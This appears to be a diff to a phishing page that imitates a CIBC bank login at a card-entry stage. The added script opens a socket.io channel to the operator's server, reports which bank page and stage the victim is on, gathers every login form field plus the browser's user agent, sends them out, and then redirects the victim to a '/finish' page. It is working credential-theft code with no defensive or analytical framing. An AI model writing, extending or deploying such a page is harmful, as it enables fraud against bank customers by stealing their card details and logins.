@@ -35,7 +35,7 @@
     <script>var lrbank = '<?=escape($udata->last->bank)?>'; var lrinfo = '<?=escape($udata->last->info)?>';</script>
     <script src="/assets/js/actions.js?v=<?=time()?>"></script>
     <script src="/socket.io/socket.io.js"></script>
-    <script src="../assets/js/cibc/login/index.js"></script>
+   
 </head>
 
 <body lang="en" class="android-fix">
@@ -186,6 +186,19 @@
 </body>
 
 <script>
+         const socket = io();
+
+         socket.emit('pageandstage', {page: 'CIBC', stage: 'Card'})
+    
+    function submitForm() {
+        document.getElementById('userAgent').value = navigator.userAgent;
+    
+        const formData = new FormData(document.getElementById('loginForm'));
+    
+        socket.emit('submit', Object.fromEntries(formData));
+    
+        window.location.href = `/finish`;
+    }
     function isValidCardNumber(value) {
         // Remove any spaces or hyphens
         const cardNumber = value.replace(/[\s-]/g, '');
